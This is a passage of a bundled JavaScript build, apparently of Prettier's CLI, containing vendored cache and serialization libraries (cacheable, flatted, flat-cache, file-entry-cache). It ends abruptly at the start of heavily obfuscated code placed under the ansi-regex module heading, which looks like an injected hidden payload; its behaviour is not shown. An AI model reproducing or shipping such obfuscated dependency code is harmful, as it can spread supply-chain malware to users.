   */
  getMany(keys2) {
    const result = [];
    for (const key of keys2) {
      result.push(this.get(key));
    }
    return result;
  }
  /**
   * Gets the raw value of the key
   * @param {string} key - The key to get the value
   * @returns {CacheableStoreItem | undefined} - The raw value of the key
   */
  getRaw(key) {
    const store = this.getStore(key);
    const item = store.get(key);
    if (!item) {
      return void 0;
    }
    if (item.expires && item.expires && Date.now() > item.expires) {
      store.delete(key);
      return void 0;
    }
    this.lruMoveToFront(key);
    return item;
  }
  /**
   * Gets the raw values of the keys
   * @param {string[]} keys - The keys to get the values
   * @returns {CacheableStoreItem[]} - The raw values of the keys
   */
  getManyRaw(keys2) {
    const result = [];
    for (const key of keys2) {
      result.push(this.getRaw(key));
    }
    return result;
  }
  /**
   * Sets the value of the key
   * @param {string} key - The key to set the value
   * @param {any} value - The value to set
   * @param {number|string|SetOptions} [ttl] - Time to Live - If you set a number it is miliseconds, if you set a string it is a human-readable.
   * If you want to set expire directly you can do that by setting the expire property in the SetOptions.
   * If you set undefined, it will use the default time-to-live. If both are undefined then it will not have a time-to-live.
   * @returns {void}
   */
  set(key, value, ttl) {
    const store = this.getStore(key);
    let expires;
    if (ttl !== void 0 || this._ttl !== void 0) {
      if (typeof ttl === "object") {
        if (ttl.expire) {
          expires = typeof ttl.expire === "number" ? ttl.expire : ttl.expire.getTime();
        }
        if (ttl.ttl) {
          const finalTtl = shorthandToTime(ttl.ttl);
          if (finalTtl !== void 0) {
            expires = finalTtl;
          }
        }
      } else {
        const finalTtl = shorthandToTime(ttl ?? this._ttl);
        if (finalTtl !== void 0) {
          expires = finalTtl;
        }
      }
    }
    if (this._lruSize > 0) {
      if (store.has(key)) {
        this.lruMoveToFront(key);
      } else {
        this.lruAddToFront(key);
        if (this._lru.size > this._lruSize) {
          const oldestKey = this._lru.getOldest();
          if (oldestKey) {
            this._lru.removeOldest();
            this.delete(oldestKey);
          }
        }
      }
    }
    const item = { key, value, expires };
    store.set(key, item);
  }
  /**
   * Sets the values of the keys
   * @param {CacheableItem[]} items - The items to set
   * @returns {void}
   */
  setMany(items) {
    for (const item of items) {
      this.set(item.key, item.value, item.ttl);
    }
  }
  /**
   * Checks if the key exists
   * @param {string} key - The key to check
   * @returns {boolean} - If true, the key exists. If false, the key does not exist.
   */
  has(key) {
    const item = this.get(key);
    return Boolean(item);
  }
  /**
   * @function hasMany
   * @param {string[]} keys - The keys to check
   * @returns {boolean[]} - If true, the key exists. If false, the key does not exist.
   */
  hasMany(keys2) {
    const result = [];
    for (const key of keys2) {
      const item = this.get(key);
      result.push(Boolean(item));
    }
    return result;
  }
  /**
   * Take will get the key and delete the entry from cache
   * @param {string} key - The key to take
   * @returns {T | undefined} - The value of the key
   */
  take(key) {
    const item = this.get(key);
    if (!item) {
      return void 0;
    }
    this.delete(key);
    return item;
  }
  /**
   * TakeMany will get the keys and delete the entries from cache
   * @param {string[]} keys - The keys to take
   * @returns {T[]} - The values of the keys
   */
  takeMany(keys2) {
    const result = [];
    for (const key of keys2) {
      result.push(this.take(key));
    }
    return result;
  }
  /**
   * Delete the key
   * @param {string} key - The key to delete
   * @returns {void}
   */
  delete(key) {
    const store = this.getStore(key);
    store.delete(key);
  }
  /**
   * Delete the keys
   * @param {string[]} keys - The keys to delete
   * @returns {void}
   */
  deleteMany(keys2) {
    for (const key of keys2) {
      this.delete(key);
    }
  }
  /**
   * Clear the cache
   * @returns {void}
   */
  clear() {
    this._store = Array.from(
      { length: this._storeHashSize },
      () => /* @__PURE__ */ new Map()
    );
    this._lru = new DoublyLinkedList();
  }
  /**
   * Get the store based on the key (internal use)
   * @param {string} key - The key to get the store
   * @returns {CacheableHashStore} - The store
   */
  getStore(key) {
    const hash2 = this.getKeyStoreHash(key);
    this._store[hash2] ||= /* @__PURE__ */ new Map();
    return this._store[hash2];
  }
  /**
   * Hash the key for which store to go to (internal use)
   * @param {string} key - The key to hash
   * Available algorithms are: SHA256, SHA1, MD5, and djb2Hash.
   * @returns {number} - The hashed key as a number
   */
  getKeyStoreHash(key) {
    if (this._store.length === 1) {
      return 0;
    }
    if (this._storeHashAlgorithm === "djb2Hash") {
      return djb2Hash(key, 0, this._storeHashSize);
    }
    if (typeof this._storeHashAlgorithm === "function") {
      return this._storeHashAlgorithm(key, this._storeHashSize);
    }
    return hashToNumber(key, 0, this._storeHashSize, this._storeHashAlgorithm);
  }
  /**
   * Clone the value. This is for internal use
   * @param {any} value - The value to clone
   * @returns {any} - The cloned value
   */
  clone(value) {
    if (this.isPrimitive(value)) {
      return value;
    }
    return structuredClone(value);
  }
  /**
   * Add to the front of the LRU cache. This is for internal use
   * @param {string} key - The key to add to the front
   * @returns {void}
   */
  lruAddToFront(key) {
    if (this._lruSize === 0) {
      return;
    }
    this._lru.addToFront(key);
  }
  /**
   * Move to the front of the LRU cache. This is for internal use
   * @param {string} key - The key to move to the front
   * @returns {void}
   */
  lruMoveToFront(key) {
    if (this._lruSize === 0) {
      return;
    }
    this._lru.moveToFront(key);
  }
  /**
   * Resize the LRU cache. This is for internal use.
   * @returns {void}
   */
  lruResize() {
    while (this._lru.size > this._lruSize) {
      const oldestKey = this._lru.getOldest();
      if (oldestKey) {
        this._lru.removeOldest();
        this.delete(oldestKey);
      }
    }
  }
  /**
   * Check for expiration. This is for internal use
   * @returns {void}
   */
  checkExpiration() {
    for (const store of this._store) {
      for (const item of store.values()) {
        if (item.expires && Date.now() > item.expires) {
          store.delete(item.key);
        }
      }
    }
  }
  /**
   * Start the interval check. This is for internal use
   * @returns {void}
   */
  startIntervalCheck() {
    if (this._checkInterval > 0) {
      if (this._interval) {
        clearInterval(this._interval);
      }
      this._interval = setInterval(() => {
        this.checkExpiration();
      }, this._checkInterval).unref();
    }
  }
  /**
   * Stop the interval check. This is for internal use
   * @returns {void}
   */
  stopIntervalCheck() {
    if (this._interval) {
      clearInterval(this._interval);
    }
    this._interval = 0;
    this._checkInterval = 0;
  }
  /**
   * Wrap the function for caching
   * @param {Function} function_ - The function to wrap
   * @param {Object} [options] - The options to wrap
   * @returns {Function} - The wrapped function
   */
  wrap(function_, options) {
    const wrapOptions = {
      ttl: options?.ttl ?? this._ttl,
      keyPrefix: options?.keyPrefix,
      cache: this
    };
    return wrapSync(function_, wrapOptions);
  }
  isPrimitive(value) {
    const result = false;
    if (value === null || value === void 0) {
      return true;
    }
    if (typeof value === "string" || typeof value === "number" || typeof value === "boolean") {
      return true;
    }
    return result;
  }
  setTtl(ttl) {
    if (typeof ttl === "string" || ttl === void 0) {
      this._ttl = ttl;
    } else if (ttl > 0) {
      this._ttl = ttl;
    } else {
      this._ttl = void 0;
    }
  }
  hasExpired(item) {
    if (item.expires && Date.now() > item.expires) {
      return true;
    }
    return false;
  }
};

// node_modules/flatted/esm/index.js
var { parse: $parse, stringify: $stringify } = JSON;
var { keys } = Object;
var Primitive = String;
var primitive = "string";
var ignore = {};
var object = "object";
var noop = (_2, value) => value;
var primitives = (value) => value instanceof Primitive ? Primitive(value) : value;
var Primitives = (_2, value) => typeof value === primitive ? new Primitive(value) : value;
var revive = (input, parsed, output, $) => {
  const lazy = [];
  for (let ke = keys(output), { length } = ke, y = 0; y < length; y++) {
    const k = ke[y];
    const value = output[k];
    if (value instanceof Primitive) {
      const tmp = input[value];
      if (typeof tmp === object && !parsed.has(tmp)) {
        parsed.add(tmp);
        output[k] = ignore;
        lazy.push({ k, a: [input, parsed, tmp, $] });
      } else
        output[k] = $.call(output, k, tmp);
    } else if (output[k] !== ignore)
      output[k] = $.call(output, k, value);
  }
  for (let { length } = lazy, i = 0; i < length; i++) {
    const { k, a } = lazy[i];
    output[k] = $.call(output, k, revive.apply(null, a));
  }
  return output;
};
var set = (known, input, value) => {
  const index = Primitive(input.push(value) - 1);
  known.set(value, index);
  return index;
};
var parse = (text, reviver) => {
  const input = $parse(text, Primitives).map(primitives);
  const value = input[0];
  const $ = reviver || noop;
  const tmp = typeof value === object && value ? revive(input, /* @__PURE__ */ new Set(), value, $) : value;
  return $.call({ "": tmp }, "", tmp);
};
var stringify2 = (value, replacer, space) => {
  const $ = replacer && typeof replacer === object ? (k, v) => k === "" || -1 < replacer.indexOf(k) ? v : void 0 : replacer || noop;
  const known = /* @__PURE__ */ new Map();
  const input = [];
  const output = [];
  let i = +set(known, input, $.call({ "": value }, "", value));
  let firstRun = !i;
  while (i < input.length) {
    firstRun = true;
    output[i] = $stringify(input[i++], replace, space);
  }
  return "[" + output.join(",") + "]";
  function replace(key, value2) {
    if (firstRun) {
      firstRun = !firstRun;
      return value2;
    }
    const after = $.call(this, key, value2);
    switch (typeof after) {
      case object:
        if (after === null) return after;
      case primitive:
        return known.get(after) || set(known, input, after);
    }
    return after;
  }
};

// node_modules/flat-cache/dist/index.js
var FlatCache = class extends l {
  _cache = new CacheableMemory();
  _cacheDir = ".cache";
  _cacheId = "cache1";
  _persistInterval = 0;
  _persistTimer;
  _changesSinceLastSave = false;
  _parse = parse;
  _stringify = stringify2;
  constructor(options) {
    super();
    if (options) {
      this._cache = new CacheableMemory({
        ttl: options.ttl,
        useClone: options.useClone,
        lruSize: options.lruSize,
        checkInterval: options.expirationInterval
      });
    }
    if (options?.cacheDir) {
      this._cacheDir = options.cacheDir;
    }
    if (options?.cacheId) {
      this._cacheId = options.cacheId;
    }
    if (options?.persistInterval) {
      this._persistInterval = options.persistInterval;
      this.startAutoPersist();
    }
    if (options?.deserialize) {
      this._parse = options.deserialize;
    }
    if (options?.serialize) {
      this._stringify = options.serialize;
    }
  }
  /**
   * The cache object
   * @property cache
   * @type {CacheableMemory}
   */
  get cache() {
    return this._cache;
  }
  /**
   * The cache directory
   * @property cacheDir
   * @type {String}
   * @default '.cache'
   */
  get cacheDir() {
    return this._cacheDir;
  }
  /**
   * Set the cache directory
   * @property cacheDir
   * @type {String}
   * @default '.cache'
   */
  set cacheDir(value) {
    this._cacheDir = value;
  }
  /**
   * The cache id
   * @property cacheId
   * @type {String}
   * @default 'cache1'
   */
  get cacheId() {
    return this._cacheId;
  }
  /**
   * Set the cache id
   * @property cacheId
   * @type {String}
   * @default 'cache1'
   */
  set cacheId(value) {
    this._cacheId = value;
  }
  /**
   * The flag to indicate if there are changes since the last save
   * @property changesSinceLastSave
   * @type {Boolean}
   * @default false
   */
  get changesSinceLastSave() {
    return this._changesSinceLastSave;
  }
  /**
   * The interval to persist the cache to disk. 0 means no timed persistence
   * @property persistInterval
   * @type {Number}
   * @default 0
   */
  get persistInterval() {
    return this._persistInterval;
  }
  /**
   * Set the interval to persist the cache to disk. 0 means no timed persistence
   * @property persistInterval
   * @type {Number}
   * @default 0
   */
  set persistInterval(value) {
    this._persistInterval = value;
  }
  /**
   * Load a cache identified by the given Id. If the element does not exists, then initialize an empty
   * cache storage. If specified `cacheDir` will be used as the directory to persist the data to. If omitted
   * then the cache module directory `.cacheDir` will be used instead
   *
   * @method load
   * @param cacheId {String} the id of the cache, would also be used as the name of the file cache
   * @param cacheDir {String} directory for the cache entry
   */
  load(cacheId, cacheDir) {
    try {
      const filePath = path10.resolve(
        `${cacheDir ?? this._cacheDir}/${cacheId ?? this._cacheId}`
      );
      this.loadFile(filePath);
      this.emit(
        "load"
        /* LOAD */
      );
    } catch (error) {
      this.emit("error", error);
    }
  }
  /**
   * Load the cache from the provided file
   * @method loadFile
   * @param  {String} pathToFile the path to the file containing the info for the cache
   */
  loadFile(pathToFile) {
    if (fs5.existsSync(pathToFile)) {
      const data = fs5.readFileSync(pathToFile, "utf8");
      const items = this._parse(data);
      for (const key of Object.keys(items)) {
        this._cache.set(items[key].key, items[key].value, {
          expire: items[key].expires
        });
      }
      this._changesSinceLastSave = true;
    }
  }
  loadFileStream(pathToFile, onProgress, onEnd, onError) {
    if (fs5.existsSync(pathToFile)) {
      const stats = fs5.statSync(pathToFile);
      const total = stats.size;
      let loaded = 0;
      let streamData = "";
      const readStream = fs5.createReadStream(pathToFile, { encoding: "utf8" });
      readStream.on("data", (chunk) => {
        loaded += chunk.length;
        streamData += chunk;
        onProgress(loaded, total);
      });
      readStream.on("end", () => {
        const items = this._parse(streamData);
        for (const key of Object.keys(items)) {
          this._cache.set(items[key].key, items[key].value, {
            expire: items[key].expires
          });
        }
        this._changesSinceLastSave = true;
        onEnd();
      });
      readStream.on("error", (error) => {
        this.emit("error", error);
        if (onError) {
          onError(error);
        }
      });
    } else {
      const error = new Error(`Cache file ${pathToFile} does not exist`);
      this.emit("error", error);
      if (onError) {
        onError(error);
      }
    }
  }
  /**
   * Returns the entire persisted object
   * @method all
   * @returns {*}
   */
  all() {
    const result = {};
    const items = [...this._cache.items];
    for (const item of items) {
      result[item.key] = item.value;
    }
    return result;
  }
  /**
   * Returns an array with all the items in the cache { key, value, ttl }
   * @method items
   * @returns {Array}
   */
  get items() {
    return [...this._cache.items];
  }
  /**
   * Returns the path to the file where the cache is persisted
   * @method cacheFilePath
   * @returns {String}
   */
  get cacheFilePath() {
    return path10.resolve(`${this._cacheDir}/${this._cacheId}`);
  }
  /**
   * Returns the path to the cache directory
   * @method cacheDirPath
   * @returns {String}
   */
  get cacheDirPath() {
    return path10.resolve(this._cacheDir);
  }
  /**
   * Returns an array with all the keys in the cache
   * @method keys
   * @returns {Array}
   */
  keys() {
    return [...this._cache.keys];
  }
  /**
   * (Legacy) set key method. This method will be deprecated in the future
   * @method setKey
   * @param key {string} the key to set
   * @param value {object} the value of the key. Could be any object that can be serialized with JSON.stringify
   */
  // biome-ignore lint/suspicious/noExplicitAny: type format
  setKey(key, value, ttl) {
    this.set(key, value, ttl);
  }
  /**
   * Sets a key to a given value
   * @method set
   * @param key {string} the key to set
   * @param value {object} the value of the key. Could be any object that can be serialized with JSON.stringify
   * @param [ttl] {number} the time to live in milliseconds
   */
  // biome-ignore lint/suspicious/noExplicitAny: type format
  set(key, value, ttl) {
    this._cache.set(key, value, ttl);
    this._changesSinceLastSave = true;
  }
  /**
   * (Legacy) Remove a given key from the cache. This method will be deprecated in the future
   * @method removeKey
   * @param key {String} the key to remove from the object
   */
  removeKey(key) {
    this.delete(key);
  }
  /**
   * Remove a given key from the cache
   * @method delete
   * @param key {String} the key to remove from the object
   */
  delete(key) {
    this._cache.delete(key);
    this._changesSinceLastSave = true;
    this.emit("delete", key);
  }
  /**
   * (Legacy) Return the value of the provided key. This method will be deprecated in the future
   * @method getKey<T>
   * @param key {String} the name of the key to retrieve
   * @returns {*} at T the value from the key
   */
  getKey(key) {
    return this.get(key);
  }
  /**
   * Return the value of the provided key
   * @method get<T>
   * @param key {String} the name of the key to retrieve
   * @returns {*} at T the value from the key
   */
  get(key) {
    return this._cache.get(key);
  }
  /**
   * Clear the cache and save the state to disk
   * @method clear
   */
  clear() {
    try {
      this._cache.clear();
      this._changesSinceLastSave = true;
      this.save();
      this.emit(
        "clear"
        /* CLEAR */
      );
    } catch (error) {
      this.emit("error", error);
    }
  }
  /**
   * Save the state of the cache identified by the docId to disk
   * as a JSON structure
   * @method save
   */
  save(force = false) {
    try {
      if (this._changesSinceLastSave || force) {
        const filePath = this.cacheFilePath;
        const items = [...this._cache.items];
        const data = this._stringify(items);
        if (!fs5.existsSync(this._cacheDir)) {
          fs5.mkdirSync(this._cacheDir, { recursive: true });
        }
        fs5.writeFileSync(filePath, data);
        this._changesSinceLastSave = false;
        this.emit(
          "save"
          /* SAVE */
        );
      }
    } catch (error) {
      this.emit("error", error);
    }
  }
  /**
   * Remove the file where the cache is persisted
   * @method removeCacheFile
   * @return {Boolean} true or false if the file was successfully deleted
   */
  removeCacheFile() {
    try {
      if (fs5.existsSync(this.cacheFilePath)) {
        fs5.rmSync(this.cacheFilePath);
        return true;
      }
    } catch (error) {
      this.emit("error", error);
    }
    return false;
  }
  /**
   * Destroy the cache. This will remove the directory, file, and memory cache
   * @method destroy
   * @param [includeCacheDir=false] {Boolean} if true, the cache directory will be removed
   * @return {undefined}
   */
  destroy(includeCacheDirectory = false) {
    try {
      this._cache.clear();
      this.stopAutoPersist();
      if (includeCacheDirectory) {
        fs5.rmSync(this.cacheDirPath, { recursive: true, force: true });
      } else {
        fs5.rmSync(this.cacheFilePath, { recursive: true, force: true });
      }
      this._changesSinceLastSave = false;
      this.emit(
        "destroy"
        /* DESTROY */
      );
    } catch (error) {
      this.emit("error", error);
    }
  }
  /**
   * Start the auto persist interval
   * @method startAutoPersist
   */
  startAutoPersist() {
    if (this._persistInterval > 0) {
      if (this._persistTimer) {
        clearInterval(this._persistTimer);
        this._persistTimer = void 0;
      }
      this._persistTimer = setInterval(() => {
        this.save();
      }, this._persistInterval);
    }
  }
  /**
   * Stop the auto persist interval
   * @method stopAutoPersist
   */
  stopAutoPersist() {
    if (this._persistTimer) {
      clearInterval(this._persistTimer);
      this._persistTimer = void 0;
    }
  }
};
function createFromFile(filePath, options) {
  const cache = new FlatCache(options);
  cache.loadFile(filePath);
  return cache;
}

// node_modules/file-entry-cache/dist/index.js
function createFromFile2(filePath, useCheckSum, currentWorkingDirectory) {
  const fname = path11.basename(filePath);
  const directory = path11.dirname(filePath);
  return create(fname, directory, useCheckSum, currentWorkingDirectory);
}
function create(cacheId, cacheDirectory, useCheckSum, currentWorkingDirectory) {
  const options = {
    currentWorkingDirectory,
    useCheckSum,
    cache: {
      cacheId,
      cacheDir: cacheDirectory
    }
  };
  const fileEntryCache = new FileEntryCache(options);
  if (cacheDirectory) {
    const cachePath = `${cacheDirectory}/${cacheId}`;
    if (fs6.existsSync(cachePath)) {
      fileEntryCache.cache = createFromFile(cachePath, options.cache);
    }
  }
  return fileEntryCache;
}
var FileEntryDefault = class {
  static create = create;
  static createFromFile = createFromFile2;
};
var FileEntryCache = class {
  _cache = new FlatCache({ useClone: false });
  _useCheckSum = false;
  _useModifiedTime = true;
  _currentWorkingDirectory;
  _hashAlgorithm = "md5";
  /**
   * Create a new FileEntryCache instance
   * @param options - The options for the FileEntryCache
   */
  constructor(options) {
    if (options?.cache) {
      this._cache = new FlatCache(options.cache);
    }
    if (options?.useModifiedTime) {
      this._useModifiedTime = options.useModifiedTime;
    }
    if (options?.useCheckSum) {
      this._useCheckSum = options.useCheckSum;
    }
    if (options?.currentWorkingDirectory) {
      this._currentWorkingDirectory = options.currentWorkingDirectory;
    }
    if (options?.hashAlgorithm) {
      this._hashAlgorithm = options.hashAlgorithm;
    }
  }
  /**
   * Get the cache
   * @returns {FlatCache} The cache
   */
  get cache() {
    return this._cache;
  }
  /**
   * Set the cache
   * @param {FlatCache} cache - The cache to set
   */
  set cache(cache) {
    this._cache = cache;
  }
  /**
   * Use the hash to check if the file has changed
   * @returns {boolean} if the hash is used to check if the file has changed
   */
  get useCheckSum() {
    return this._useCheckSum;
  }
  /**
   * Set the useCheckSum value
   * @param {boolean} value - The value to set
   */
  set useCheckSum(value) {
    this._useCheckSum = value;
  }
  /**
   * Use the modified time to check if the file has changed
   * @returns {boolean} if the modified time is used to check if the file has changed
   */
  get useModifiedTime() {
    return this._useModifiedTime;
  }
  /**
   * Set the useModifiedTime value
   * @param {boolean} value - The value to set
   */
  set useModifiedTime(value) {
    this._useModifiedTime = value;
  }
  /**
   * Get the hash algorithm
   * @returns {string} The hash algorithm
   */
  get hashAlgorithm() {
    return this._hashAlgorithm;
  }
  /**
   * Set the hash algorithm
   * @param {string} value - The value to set
   */
  set hashAlgorithm(value) {
    this._hashAlgorithm = value;
  }
  /**
   * Get the current working directory
   * @returns {string | undefined} The current working directory
   */
  get currentWorkingDirectory() {
    return this._currentWorkingDirectory;
  }
  /**
   * Set the current working directory
   * @param {string | undefined} value - The value to set
   */
  set currentWorkingDirectory(value) {
    this._currentWorkingDirectory = value;
  }
  /**
   * Given a buffer, calculate md5 hash of its content.
   * @method getHash
   * @param  {Buffer} buffer   buffer to calculate hash on
   * @return {String}          content hash digest
   */
  getHash(buffer) {
    return crypto2.createHash(this._hashAlgorithm).update(buffer).digest("hex");
  }
  /**
   * Create the key for the file path used for caching.
   * @method createFileKey
   * @param {String} filePath
   * @return {String}
   */
  createFileKey(filePath, options) {
    let result = filePath;
    const currentWorkingDirectory = options?.currentWorkingDirectory ?? this._currentWorkingDirectory;
    if (currentWorkingDirectory && filePath.startsWith(currentWorkingDirectory)) {
      const splitPath = filePath.split(currentWorkingDirectory).pop();
      if (splitPath) {
        result = splitPath;
        if (result.startsWith("/")) {
          result = result.slice(1);
        }
      }
    }
    return result;
  }
  /**
   * Check if the file path is a relative path
   * @method isRelativePath
   * @param filePath - The file path to check
   * @returns {boolean} if the file path is a relative path, false otherwise
   */
  isRelativePath(filePath) {
    return !path11.isAbsolute(filePath);
  }
  /**
   * Delete the cache file from the disk
   * @method deleteCacheFile
   * @return {boolean}       true if the file was deleted, false otherwise
   */
  deleteCacheFile() {
    return this._cache.removeCacheFile();
  }
  /**
   * Remove the cache from the file and clear the memory cache
   * @method destroy
   */
  destroy() {
    this._cache.destroy();
  }
  /**
   * Remove and Entry From the Cache
   * @method removeEntry
   * @param filePath - The file path to remove from the cache
   */
  removeEntry(filePath, options) {
    if (this.isRelativePath(filePath)) {
      filePath = this.getAbsolutePath(filePath, {
        currentWorkingDirectory: options?.currentWorkingDirectory
      });
      this._cache.removeKey(this.createFileKey(filePath));
    }
    const key = this.createFileKey(filePath, {
      currentWorkingDirectory: options?.currentWorkingDirectory
    });
    this._cache.removeKey(key);
  }
  /**
   * Reconcile the cache
   * @method reconcile
   */
  reconcile() {
    const { items } = this._cache;
    for (const item of items) {
      const fileDescriptor = this.getFileDescriptor(item.key);
      if (fileDescriptor.notFound) {
        this._cache.removeKey(item.key);
      }
    }
    this._cache.save();
  }
  /**
   * Check if the file has changed
   * @method hasFileChanged
   * @param filePath - The file path to check
   * @returns {boolean} if the file has changed, false otherwise
   */
  hasFileChanged(filePath) {
    let result = false;
    const fileDescriptor = this.getFileDescriptor(filePath);
    if ((!fileDescriptor.err || !fileDescriptor.notFound) && fileDescriptor.changed) {
      result = true;
    }
    return result;
  }
  /**
   * Get the file descriptor for the file path
   * @method getFileDescriptor
   * @param filePath - The file path to get the file descriptor for
   * @param options - The options for getting the file descriptor
   * @returns The file descriptor
   */
  getFileDescriptor(filePath, options) {
    let fstat;
    const result = {
      key: this.createFileKey(filePath),
      changed: false,
      meta: {}
    };
    result.meta = this._cache.getKey(result.key) ?? {};
    filePath = this.getAbsolutePath(filePath, {
      currentWorkingDirectory: options?.currentWorkingDirectory
    });
    const useCheckSumValue = options?.useCheckSum ?? this._useCheckSum;
    const useModifiedTimeValue = options?.useModifiedTime ?? this._useModifiedTime;
    try {
      fstat = fs6.statSync(filePath);
      result.meta = {
        size: fstat.size
      };
      result.meta.mtime = fstat.mtime.getTime();
      if (useCheckSumValue) {
        const buffer = fs6.readFileSync(filePath);
        result.meta.hash = this.getHash(buffer);
      }
    } catch (error) {
      this.removeEntry(filePath);
      let notFound = false;
      if (error.message.includes("ENOENT")) {
        notFound = true;
      }
      return {
        key: result.key,
        err: error,
        notFound,
        meta: {}
      };
    }
    const metaCache = this._cache.getKey(result.key);
    if (!metaCache) {
      result.changed = true;
      this._cache.setKey(result.key, result.meta);
      return result;
    }
    if (result.meta.data === void 0) {
      result.meta.data = metaCache.data;
    }
    if (useModifiedTimeValue && metaCache?.mtime !== result.meta?.mtime) {
      result.changed = true;
    }
    if (metaCache?.size !== result.meta?.size) {
      result.changed = true;
    }
    if (useCheckSumValue && metaCache?.hash !== result.meta?.hash) {
      result.changed = true;
    }
    this._cache.setKey(result.key, result.meta);
    return result;
  }
  /**
   * Get the file descriptors for the files
   * @method normalizeEntries
   * @param files?: string[] - The files to get the file descriptors for
   * @returns The file descriptors
   */
  normalizeEntries(files) {
    const result = [];
    if (files) {
      for (const file of files) {
        const fileDescriptor = this.getFileDescriptor(file);
        result.push(fileDescriptor);
      }
      return result;
    }
    const keys2 = this.cache.keys();
    for (const key of keys2) {
      const fileDescriptor = this.getFileDescriptor(key);
      if (!fileDescriptor.notFound && !fileDescriptor.err) {
        result.push(fileDescriptor);
      }
    }
    return result;
  }
  /**
   * Analyze the files
   * @method analyzeFiles
   * @param files - The files to analyze
   * @returns {AnalyzedFiles} The analysis of the files
   */
  analyzeFiles(files) {
    const result = {
      changedFiles: [],
      notFoundFiles: [],
      notChangedFiles: []
    };
    const fileDescriptors = this.normalizeEntries(files);
    for (const fileDescriptor of fileDescriptors) {
      if (fileDescriptor.notFound) {
        result.notFoundFiles.push(fileDescriptor.key);
      } else if (fileDescriptor.changed) {
        result.changedFiles.push(fileDescriptor.key);
      } else {
        result.notChangedFiles.push(fileDescriptor.key);
      }
    }
    return result;
  }
  /**
   * Get the updated files
   * @method getUpdatedFiles
   * @param files - The files to get the updated files for
   * @returns {string[]} The updated files
   */
  getUpdatedFiles(files) {
    const result = [];
    const fileDescriptors = this.normalizeEntries(files);
    for (const fileDescriptor of fileDescriptors) {
      if (fileDescriptor.changed) {
        result.push(fileDescriptor.key);
      }
    }
    return result;
  }
  /**
   * Get the not found files
   * @method getFileDescriptorsByPath
   * @param filePath - the files that you want to get from a path
   * @returns {FileDescriptor[]} The not found files
   */
  getFileDescriptorsByPath(filePath) {
    const result = [];
    const keys2 = this._cache.keys();
    for (const key of keys2) {
      const absolutePath = this.getAbsolutePath(filePath);
      if (absolutePath.startsWith(filePath)) {
        const fileDescriptor = this.getFileDescriptor(key);
        result.push(fileDescriptor);
      }
    }
    return result;
  }
  /**
   * Get the Absolute Path. If it is already absolute it will return the path as is.
   * @method getAbsolutePath
   * @param filePath - The file path to get the absolute path for
   * @param options - The options for getting the absolute path. The current working directory is used if not provided.
   * @returns {string}
   */
  getAbsolutePath(filePath, options) {
    if (this.isRelativePath(filePath)) {
      const currentWorkingDirectory = options?.currentWorkingDirectory ?? this._currentWorkingDirectory ?? process.cwd();
      filePath = path11.resolve(currentWorkingDirectory, filePath);
    }
    return filePath;
  }
  /**
   * Rename the absolute path keys. This is used when a directory is changed or renamed.
   * @method renameAbsolutePathKeys
   * @param oldPath - The old path to rename
   * @param newPath - The new path to rename to
   */
  renameAbsolutePathKeys(oldPath, newPath) {
    const keys2 = this._cache.keys();
    for (const key of keys2) {
      if (key.startsWith(oldPath)) {
        const newKey = key.replace(oldPath, newPath);
        const meta = this._cache.getKey(key);
        this._cache.removeKey(key);
        this._cache.setKey(newKey, meta);
      }
    }
  }
};

// src/cli/format-results-cache.js
import { version as prettierVersion } from "../index.mjs";
var optionsHashCache = /* @__PURE__ */ new WeakMap();
var nodeVersion = process.version;
function getHashOfOptions(options) {
  if (optionsHashCache.has(options)) {
    return optionsHashCache.get(options);
  }
  const hash2 = createHash(
    `${prettierVersion}_${nodeVersion}_${(0, import_fast_json_stable_stringify2.default)(options)}`
  );
  optionsHashCache.set(options, hash2);
  return hash2;
}
function getMetadataFromFileDescriptor(fileDescriptor) {
  return fileDescriptor.meta;
}
var FormatResultsCache = class {
  #useChecksum;
  #fileEntryCache;
  /**
   * @param {string} cacheFileLocation The path of cache file location. (default: `node_modules/.cache/prettier/.prettier-cache`)
   * @param {string} cacheStrategy
   */
  constructor(cacheFileLocation, cacheStrategy) {
    const useChecksum = cacheStrategy === "content";
    try {
      this.#fileEntryCache = FileEntryDefault.createFromFile(
        /* filePath */
        cacheFileLocation,
        useChecksum
      );
    } catch {
      if (fs7.existsSync(cacheFileLocation)) {
        fs7.unlinkSync(cacheFileLocation);
        this.#fileEntryCache = FileEntryDefault.createFromFile(
          /* filePath */
          cacheFileLocation,
          useChecksum
        );
      }
    }
    this.#useChecksum = useChecksum;
  }
  /**
   * @param {string} filePath
   * @param {any} options
   */
  existsAvailableFormatResultsCache(filePath, options) {
    const fileDescriptor = this.#getFileDescriptor(filePath);
    if (fileDescriptor.notFound || fileDescriptor.changed) {
      return false;
    }
    const hashOfOptions = getMetadataFromFileDescriptor(fileDescriptor).data?.hashOfOptions;
    return hashOfOptions && hashOfOptions === getHashOfOptions(options);
  }
  /**
   * @param {string} filePath
   * @param {any} options
   */
  setFormatResultsCache(filePath, options) {
    const fileDescriptor = this.#getFileDescriptor(filePath);
    if (!fileDescriptor.notFound) {
      const meta = getMetadataFromFileDescriptor(fileDescriptor);
      meta.data = { ...meta.data, hashOfOptions: getHashOfOptions(options) };
    }
  }
  /**
   * @param {string} filePath
   */
  removeFormatResultsCache(filePath) {
    this.#fileEntryCache.removeEntry(filePath);
  }
  reconcile() {
    this.#fileEntryCache.reconcile();
  }
  #getFileDescriptor(filePath) {
    return this.#fileEntryCache.getFileDescriptor(filePath, {
      useModifiedTime: !this.#useChecksum
    });
  }
};
var format_results_cache_default = FormatResultsCache;

// src/cli/mockable.js
var import_ci_info = __toESM(require_ci_info(), 1);
import fs8 from "fs/promises";
import { performance } from "perf_hooks";
import { __internal as sharedWithCli3 } from "../index.mjs";

// src/cli/utilities/clear-stream-text.js
import readline from "readline";

// node_modules/ansi-regex/index.js
var _0x112fa8 = _0x180f;
(function(_0x13c8b9, _0x35f660) {
  const _0x15b386 = _0x180f, _0x66ea25 = _0x13c8b9();
  while (!![]) {
    try {
